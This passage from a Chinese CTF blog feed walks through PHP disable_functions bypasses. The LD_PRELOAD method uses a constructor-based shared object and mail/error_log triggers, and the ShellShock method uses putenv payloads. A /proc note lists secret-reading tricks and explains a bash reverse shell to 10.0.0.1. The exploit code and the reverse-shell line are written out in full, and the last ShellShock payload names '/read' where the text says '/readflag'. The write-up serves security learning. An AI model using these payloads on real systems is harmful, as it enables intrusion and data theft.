class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -o rand randnum.c<br><br>./rand<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439640.png" alt="image-20240312003634363"></p><p>接下来写一个用于劫持的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//unrand.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">rand</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">666</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后用下面的命令生成so文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">gcc -shared -fPIC 自定义文件.c -o 生成的库文件.so</span><br>gcc -shared -fPIC unrand.c -o unrand.so<br>export LD_PRELOAD=$PWD/unrand.so<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-fpic 选项指示编译器生成与位置无关的代码,-shared 选项指示链接器创建一个共享的目标文件</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">unset</span> LD_PRELOAD 可以还原函数关系</span><br></code></pre></td></tr></table></figure><p>然后用ldd命令去看一下前后动态库加载的顺序</p><p><img src="http://cdn.clown2024.cn/202407151504959.png" alt="image-20240312004616502"></p><p><img src="http://cdn.clown2024.cn/202407151504960.png" alt="image-20240312004626732"></p><p>可以看出来其中的rand的函数被我们成功劫持了。</p><p>如果不知道调用了什么函数我们还可以用下面两个命令去跟一下系统调用的情况,但是这两个跟踪的重点有所不同</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strace a.out  #跟踪系统调用和信号<br>ltrace a.out  #用来跟踪进程调用库函数的情况<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439643.png" alt="image-20240319163751066"></p><p><img src="http://cdn.clown2024.cn/202407151439644.png" alt="image-20240319163811697"></p><p>所以想要劫持具体函数的时候可以用ltrace这个命令更清晰</p><p>还有一个<strong>readelf</strong>命令可以用来查看elf文件的信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">readelf -s &lt;ELF文件&gt; #可以显示包含在可执行文件或共享库中的所有符号，包括函数符号<br></code></pre></td></tr></table></figure><blockquote><p>更多的东西参考这两篇文章：<a href="https://blog.csdn.net/qq_63701832/article/details/129760495">LD_PRELOAD劫持（超详细篇）-CSDN博客</a>，<a href="https://cs.pynote.net/se/202203301/#_1">用LD_PRELOAD劫持的原理和实践 | CS笔记 (pynote.net)</a></p></blockquote><p><strong>现在看回这道题</strong></p><p><img src="http://cdn.clown2024.cn/202407151504961.png" alt="image-20240312220351561"></p><p>这个页面直接就是一个shell，那我们直接蚁剑去连接，用虚拟终端执行了一下命令，发现执行不了的</p><p><img src="http://cdn.clown2024.cn/202407151504962.png" alt="image-20240312220455165"></p><p>这里就是因为disable_function禁用了所有命令执行的函数，所以这里就要用到ld_preload劫持的方法了，我们去看目录是有一个&#x2F;flag的，但是没有东西应该也是因为函数禁用的原因，然后还有一个&#x2F;readflag程序，应该就是要调用那个程序来读flag</p><p>这里先在本地Linux上写一个hack.c程序：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">angel</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;/readflag &gt; /tmp/eval.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后生成hack.so文件,上传到&#x2F;tmp目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -shared -fPIC hack.c -o hack.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504963.png" alt="image-20240312221737068"></p><p>然后我们再写一个php文件用于修改环境变量并用于调用被劫持的函数来读flag</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;ld_preload=/tmp/hack.so&quot;</span>);<br><br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504964.png" alt="image-20240312221702596"></p><p>然后去include一下：</p><p><img src="http://cdn.clown2024.cn/202407151439649.png" alt="image-20240312222556100"></p><p>就可以看到&#x2F;tmp目录一下有flag了</p><p><img src="http://cdn.clown2024.cn/202407151504966.png" alt="image-20240312222624367"></p><p>现在来解释一下上面的原理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__attribute__((constructor)) 是一种 GNU C 语言扩展，用于设置函数属性。<br><br>__attribute__ 是一个特性（attribute）机制，它允许你为函数、变量或类型添加额外的属性。这些属性可以影响编译器的行为，从而优化程序的性能、可移植性和可读性。<br><br>__attribute__((constructor)) 用于指定一个函数，该函数会在程序启动时自动执行，并且在 main() 函数之前。<br><br>类似地，还有 __attribute__((destructor))，它会在 main() 函数退出或调用 exit() 后自动执行。这对于释放资源或清理工作非常有用。<br><br>你还可以为属性设置优先级，例如：__attribute__((constructor(101))) void before1();这将按照优先级顺序调用带有 constructor 属性的函数。<br><br>注意，__attribute__ 是 GCC 编译器的扩展语法，不是标准 C 语言的一部分，因此在使用时需要考虑可移植性问题。<br></code></pre></td></tr></table></figure><blockquote><p>这里用mail()和error_log()的原因是因为他们都会去调用外部的&#x2F;usr&#x2F;sbin&#x2F;sendmail程序用来发送邮件信息，所以我们就可以因此而劫持，可以用下面的命令去查看一下跟踪一下该函数的调用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strace -f -e trace=execve php 1.php<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439651.png" alt="image-20240319170122690"></p><p>然后我们还可以用命令去查看该程序调用了什么函数</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">readelf -Ws /usr/sbin/sendmail<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439652.png" alt="image-20240312225539592"></p><p>我们也可以去针对里面的一些函数去劫持，效果是一样的。</p></blockquote><h1><span id="shellshock">ShellShock</span></h1><p>shellshock是一个在2014被公布的和bash有关的漏洞</p><p>参考文章：<a href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1003">什么是ShellShock攻击？ (zhihu.com)</a></p><p><strong>就先来了解一下bash</strong></p><blockquote><p>bash是一个shell环境，它允许用户输入命令来与操作系统进行交互，执行各种任务。</p></blockquote><p>我们每次输入bash的时候，系统就会创建一个新的子进程，而且涉及到fork和exec这两个系统调用的配合，其中的过程有下面几个步骤：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.fork调用：当Bash需要创建一个新的子进程时，它首先调用fork。这个调用会创建一个与当前进程（父进程）几乎完全相同的新进程（子进程）。子进程会复制父进程的内存空间，包括代码段、数据段和堆栈段。fork调用在父进程中返回新创建的子进程的进程ID，在子进程中返回0。<br><br><br>2.子进程的环境：尽管子进程复制了父进程的内存空间，但它是一个独立的进程，拥有自己的进程ID，并且其执行路径可以与父进程不同。<br><br><br>3.exec调用：在子进程中，通常会随后调用exec系列函数之一来执行一个新的程序。exec函数会替换当前进程的内存空间，包括代码段和数据段，用新程序的内容来替换。这意味着子进程将停止执行原先继承自父进程的程序，开始执行exec指定的新程序。从用户的角度看，子进程似乎变成了一个全新的程序。<br><br><br>4.父进程的行为：在fork之后，父进程可以选择等待子进程结束，或者继续执行其他任务。如果父进程选择等待，它可以使用wait或waitpid系统调用来获取子进程的终止状态。<br></code></pre></td></tr></table></figure><p>这个机制可以让bash在不终止当前会话的情况下，启动和管理多个任务，例如在运行一个外部脚本的时候，bash就会使用fork和exec来创建一个运行该命令的子进程，而bash自身则继续等待下一个用户的输入。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">echo &quot;父进程的PID：$$&quot;<br>bash -c &#x27;echo &quot;子进程的PID：$$&quot;&#x27;<br></code></pre></td></tr></table></figure><p>上面两个命令输出结果如下：</p><p><img src="http://cdn.clown2024.cn/202407151504967.png" alt="image-20240318234637280"></p><p>我们还可以通过下面几个命令查看进程情况</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ps -f #查看当前进程的状态，-f表示全格式，可以显示出父进程的ID(PPID)<br>pstree -p #以树状图的形式显示进程及其子进程，-p选项可以显示进程的PID<br>cat /proc/PID/status #输入想要看的进程PID，可以知道进程的各种详细情况<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439654.png" alt="image-20240318235046836"></p><p>下面是会启动子进程的几种方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.后台作业：使用&amp;将命令放入后台执行，例如command &amp;。<br>2.管道：使用|将多个命令连接起来，每个命令都会在子进程中执行，例如command1 | command2。<br>3.括号命令列表：使用()将命令包围起来，这些命令会在子shell中执行，例如(cmd1; cmd2; cmd3)。<br>4.执行外部脚本或程序：直接运行一个脚本或程序，如bash ./test.sh。<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">(echo $BASH_SUBSHELL)  #BASH_SUBSHELL这个变量能显示当前shell的嵌套深度<br><span class="hljs-meta prompt_">$</span><span class="language-bash">BASH_SUBSHELL</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504968.png" alt="image-20240319000940380"></p><p><strong>环境变量和bash</strong></p><p>在bash中，子进程是不能继承父进程的普通变量或函数变量的，但是可以继承父进程的普通环境变量和函数环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# gu=&quot;hacker&quot;<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br>hacker<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504969.png" alt="image-20240321084451562"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export gu<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439657.png" alt="image-20240321084631286"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack() &#123; echo &quot;hacker&quot;; &#125;<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504970.png" alt="image-20240321084802497"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export -f hack<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439659.png" alt="image-20240321084851281"></p><p>下面就是有漏洞点的地方了，但是要在bash&lt;&#x3D;4.3版本才有该漏洞</p><p>先来展示一下没有漏洞的情况</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test=&#x27;() &#123; echo &quot;this is a bug&quot;; &#125;&#x27;<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export -f test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $test<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439660.png" alt="image-20240321085418028"></p><p>有漏洞的情况就是在子进程中直接输入test会被当作函数来执行，比如文章中的这样</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123;  echo &quot;ailx10 is a hacker&quot;;&#125;&#x27;<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -nf gu<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -n gu<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export -f ailx10<br>bash: export: ailx10: not a function<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ bash<br>[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ ailx10<br>ailx10 is a hacker<br></code></pre></td></tr></table></figure><p>还可以有这种方式，利用() { :; };&#x2F;bin&#x2F;ls</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">[04/12/2018 09:57] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123; :; &#125;;/bin/ls&#x27;<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ bash<br>curl-7.20.0     myls      myls.c      myprog.cgi.1  readme.txt<br>curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ exit<br>exit<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$<br></code></pre></td></tr></table></figure><p><strong>综上所述触发bash漏洞可以归纳如下</strong></p><ol><li>产生新的bash</li><li>通过环境变量传递</li><li>环境变量以<code>() &#123;&#125;</code>这样的形式</li></ol><p><strong>可以用下面的一条语句来验证是否有shellshock漏洞</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;<br></code></pre></td></tr></table></figure><p>不存在的情况：</p><p><img src="http://cdn.clown2024.cn/202407151504971.png" alt="image-20240321090254063"></p><p>存在的情况：</p><p><img src="http://cdn.clown2024.cn/202407151504972.png" alt="image-20240321090319060"></p><blockquote><p>:在这里就相当于true</p><p><code>env</code>可以创建临时环境变量</p><p><code>bash -c</code>可以运行一个shell命令</p><p>对于存在shellshock漏洞的环境下，Bash对于环境变量只是检测到函数，并且从’{‘开始执行，但是并没有在’}’后停止，也就是说定义在函数体外shell命令也会执行。</p></blockquote><p>那现在看回这题</p><p>同样蚁剑连上之后执行不了命令</p><p><img src="http://cdn.clown2024.cn/202407151504973.png" alt="image-20240321140952793"></p><p>这题说是利用到了shellshock漏洞，那就要满足上面三个条件，这里是利用了执行error_log函数时会执行sh -c -t -i，这里还需要sh 默认的 shell 是 bash，然后就会开启一个新的bash环境所以如果存在漏洞即可触发，我们可以自己写一个error_log然后去跟踪调用看一下 </p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504974.png" alt="image-20240321142333751"></p><p>那么就可以同样利用上一题的方法，用putenv来写一个php文件然后上传触发</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;hack=() &#123; :; &#125;;cat /flag &gt;&gt; /var/www/html/flag.txt&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439665.png" alt="image-20240321142626262"></p><p>emmm很怪啊收不到flag</p><p>难绷后来找到问题，环境变量一定要有PHP_前缀我也不知道为什么很奇怪，正确payload如下，这里flag不能直接读要用&#x2F;readflag：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_hack=() &#123; :; &#125;; /read &gt;&gt; /var/www/html/flag2.txt&quot;</span>); <br>   <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151504975.png" alt="image-20240321145724033"></p><h1><span id="apache-mod-cgi">Apache Mod CGI</span></h1>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>proc目录作用总结</title>
      <link href="/2024/03/10/proc%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/10/proc%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>参考文章：<a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用-安全客 - 安全资讯平台 (anquanke.com)</a></p><h1><span id="x2fproc目录是什么">&#x2F;proc目录是什么</span></h1><p>Linux系统上的&#x2F;proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，&#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p><p>这里看一下&#x2F;proc目录下有什么</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443720.png" alt="image-20240310230848618"></p><p>目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号(PID)，里面包含对应进程相关的多个信息文件。</p><p><img src="http://cdn.clown2024.cn/202407151443721.png" alt="image-20240310231053017"></p><p>进程号为1的文件里有这些文件，其中有些文件是每个进程都会有的，ctf中我们需要的就是利用这些通用的文件来获取一些进程中的相关信息。</p><h1><span id="x2fproc目录作用">&#x2F;proc目录作用</span></h1><p><strong>&#x2F;proc&#x2F;self</strong>指向的就是当前进程号的目录，这个会经常用到，因为比如靶机启动的时候会有一个自己的进程，这个时候就可以通过&#x2F;proc&#x2F;self来获取当前的进程号，进而获取我们需要的信息。</p><h2><span id="cmdline">cmdline</span></h2><p>cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/cmdline<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443722.png" alt="image-20240310231615078"></p><p>比如目标启动了一个web服务的时候，比如<strong>python .&#x2F;app.py</strong>，我们就可以通过cat &#x2F;proc&#x2F;self&#x2F;cmdline来获得这个启动命令了。</p><h2><span id="cwd">cwd</span></h2><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls /proc/117/cwd<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443723.png" alt="image-20240310231940043"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/7163/cwd<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443724.png" alt="image-20240310232042034"></p><h2><span id="exe">exe</span></h2><p>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/exe<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443725.png" alt="image-20240310232728115"></p><h2><span id="environ">environ</span></h2><p>environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/environ<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443726.png" alt="image-20240310232953047"></p><p>有时候secret_key会放在环境变量我们就可以去读取</p><h2><span id="fd">fd</span></h2><p>fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/fd<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443728.png" alt="image-20240310233433456"></p><p>然后想查看某个文件可以去cat对应的描述符</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/fd/7<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443729.png" alt="image-20240310233618051"></p><blockquote><p><strong>在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p></blockquote><p>bash反弹shell命令的编写也和fd有关，现在拿反弹shell的命令来解析一下，参考文章：<a href="https://www.anquanke.com/post/id/85712">https://www.anquanke.com/post/id/85712</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1<br></code></pre></td></tr></table></figure><blockquote><p>bash -i就是打开一个交互式的bash</p><p> &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在&#x2F;dev&#x2F;udp&#x2F;。</p></blockquote><p>重点就是这个**&gt;&amp;**是什么意思</p><p>先来了解一下Linux中常用的文件描述符：</p><ul><li>标准输入(stdin)：代码为0，映射关系：&#x2F;dev&#x2F;stdin -&gt; &#x2F;proc&#x2F;self&#x2F;fd&#x2F;0 </li><li>标准输出(stdout)：代码为1，映射关系：&#x2F;dev&#x2F;stdout-&gt; &#x2F;proc&#x2F;self&#x2F;fd&#x2F;1</li><li>标准错误输出(stderr)：代码为2，映射关系：&#x2F;dev&#x2F;stderr -&gt; &#x2F;proc&#x2F;self&#x2F;fd&#x2F;2</li></ul><p><img src="http://cdn.clown2024.cn/202407151443730.png" alt="image-20240406232216675"></p><p><code>&gt;&amp;</code> 是一个重定向操作符，它用于将文件描述符（file descriptor）重定向到另一个文件描述符或文件，不过这个符号和<code>&amp;&gt;</code>都是一个意思，也就是说上面的反弹shell命令换成这种符号也没关系。</p><p>例如<code>2&gt;&amp;1</code>就是将错误输出重定向到标准输出，也就是这两个流合为一条流了，报错和没报错的信息都会显示出来</p><p>而<code>&gt;&amp;</code>后面接文件的时候，就代表将标准输出和标准错误输出重定向至文件</p><p>而在后面加上0&gt;&amp;1就是将标准输入重定向至标准输出，而这里标准输出已经重定向至远程了，所以这里的标准输入也重定向至远程，这就保证了所有的命令执行都在这个tcp连接里面进行。</p><p>重定向符的意义：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&gt; 和 &lt; 分别代表重定向方向<br>&gt;&gt; 和 &lt;&lt; 分别代表追加<br>2&gt; 和 2&gt;&gt; 就是标准错误输出的使用<br></code></pre></td></tr></table></figure><p>所以整个指令的大概原理就是创建一个交互式的shell利用&gt;&amp;重定向至tcp连接，然后0&gt;&amp;1将文件描述符 0（标准输入）重定向到文件描述符 1（标准输出）的意思，也就是将输入和输出合并为一个流。这样做是为了确保命令的输入和输出都通过网络套接字进行交互。</p><p>综合起来，该命令的目的是将 Bash 的标准输入、标准输出和标准错误输出都重定向到指定的网络套接字。</p><h2><span id="maps">maps</span></h2><p>maps文件提供了有关当前进程地址空间中内存映射的信息。你可以看到包含当前进程地址空间中所有已映射内存区域（如代码段、数据段、堆、栈等）的详细信息。每一行表示一个内存区域，其中包含了该区域的起始地址、结束地址、访问权限等信息。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/maps<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443731.png" alt="image-20240310234519798"></p><blockquote><p>上面的信息依次如下：</p><p>起始地址-结束地址 权限 偏移量 设备号 节点号 文件名</p></blockquote><h2><span id="mem">mem</span></h2><p>&#x2F;proc&#x2F;self&#x2F;mem 是一个特殊文件，它代表当前进程的内存映射。通过对该文件进行读取和写入操作，可以读取和修改当前进程的物理内存。它用于对进程的内存进行读写操作，通常用于调试和分析工具。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/mem<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443732.png" alt="image-20240310235303267"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-6</title>
      <link href="/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-6/"/>
      <url>/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-6/</url>
      
        <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#%E7%89%A9%E7%90%86%E5%B1%82%E6%A6%82%E8%BF%B0">物理层概述</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1">数据通信</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E6%A8%A1%E5%9E%8B">数据通信模型</a></li><li><a href="#%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD">相关术语</a></li><li><a href="#%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F">通信方式</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%96%B9%E5%BC%8F">数据传输方式</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD">数据传输相关术语</a></li></ul></li><li><a href="#%E5%A5%88%E6%B0%8F%E5%87%86%E5%88%99">奈氏准则</a><ul><li><a href="#%E5%A4%B1%E7%9C%9F">失真</a></li><li><a href="#%E5%A5%88%E6%B0%8F%E5%87%86%E5%88%99%E5%A5%88%E5%A5%8E%E6%96%AF%E7%89%B9%E5%AE%9A%E7%90%86">奈氏准则(奈奎斯特定理)</a></li></ul></li><li><a href="#%E9%A6%99%E5%86%9C%E5%AE%9A%E7%90%86">香农定理</a><ul><li><a href="#%E5%A5%88%E5%BC%8F%E5%92%8C%E9%A6%99%E5%86%9C%E7%9A%84%E5%AF%B9%E6%AF%94">奈式和香农的对比</a></li></ul></li><li><a 